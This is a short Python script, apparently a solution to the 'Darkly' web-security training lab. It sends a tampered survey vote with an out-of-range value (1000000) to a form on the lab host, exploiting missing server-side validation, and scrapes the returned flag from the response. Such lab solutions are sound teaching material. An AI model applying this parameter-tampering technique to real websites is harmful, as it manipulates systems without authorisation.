import os
import requests
import re

ip = os.getenv('darkly_ip')

if __name__ == '__main__':
    r = requests.post(f'http://{ip}/index.php?page=survey', data={
        'sujet': 2,
        'valeur': 1000000,
    })
    m = re.findall('The flag is ([a-z0-9]+)<', r.text)
    print(*m)

